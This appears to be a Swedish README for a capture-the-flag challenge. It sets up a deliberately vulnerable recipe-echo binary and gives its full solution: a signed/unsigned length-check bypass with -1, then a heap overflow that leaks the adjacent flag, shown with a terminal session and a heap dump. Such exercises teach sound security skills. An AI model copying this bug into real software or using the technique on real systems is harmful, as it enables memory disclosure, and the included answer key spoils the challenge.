# Utmaning: ReceptSpegel
Ett superanvändbart program som låter dig skicka in ett recept och få det tillbaka. Måtte den inte skriva ut något mer än ditt recept!

## Skapa utmaning
Använd den färdiga binären `receptspegel`, annars kompilera med `gcc main.c -o receptspegel`.
Skapa filen `flag.txt` innehållandes flaggsträngen och lägg den i samma mapp som binären.

## Mål
Få binären att skriva ut flaggsträngen.

## Lösning
Kom förbi längdkontrollen (som jämför en signed int med en unsigned int) med t.ex. `-1`.
Skriv in 143 tecken (vilket blir 144 inklusive `\n`) som kommer fylla upp receptets allokering på
heapen plus 8 bytes av metadata på flaggans allokering. När `printf` skriver ut receptet så kommer flaggan då att inkluderas.

```bash
$ ./receptspegel 
Välkommen till RS (ReceptSpegel) - skriv ett recept och få det tillbaka!
Receptets längd: -1
Skriv ditt recept: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Recept: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
CTF{exempel_flagga_123}
```

Så här ser heapen ut efter att man skickat in 144 tecken:
```
0x555555559298: 0x0000000000000091      0x6161616161616161
0x5555555592a8: 0x6161616161616161      0x6161616161616161
0x5555555592b8: 0x6161616161616161      0x6161616161616161
0x5555555592c8: 0x6161616161616161      0x6161616161616161
0x5555555592d8: 0x6161616161616161      0x6161616161616161
0x5555555592e8: 0x6161616161616161      0x6161616161616161
0x5555555592f8: 0x6161616161616161      0x6161616161616161
0x555555559308: 0x6161616161616161      0x6161616161616161
0x555555559318: 0x6161616161616161      0x6161616161616161
0x555555559328: 0x0a61616161616161      0x703433687b465443
0x555555559338: 0x7d6e75665f35695f      0x000000000000000a
```